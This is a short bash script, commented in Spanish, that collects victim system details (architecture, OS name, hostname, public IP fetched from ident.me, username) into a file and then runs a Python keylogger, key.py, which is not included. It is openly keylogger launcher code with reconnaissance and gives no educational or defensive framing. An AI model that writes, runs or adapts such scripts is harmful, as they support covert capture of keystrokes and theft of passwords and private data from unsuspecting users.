#!/bin/bash

#Captura de arquitectura
lscpu | grep Arquitectura > datos.txt

#Captura de nombre del sistema operativo
uname >> datos.txt

#Captura de nombre del host
hostname >> datos.txt

#Captura de IP Pública
curl https://ident.me >> datos.txt
echo "" >> datos.txt

#Captura de nombre de usuario
whoami >> datos.txt

#Inicio del keylogger

#Borrado del archivo de salida anterior
rm reporte.txt

#Ejecución del keylogger en Python
python3 key.py
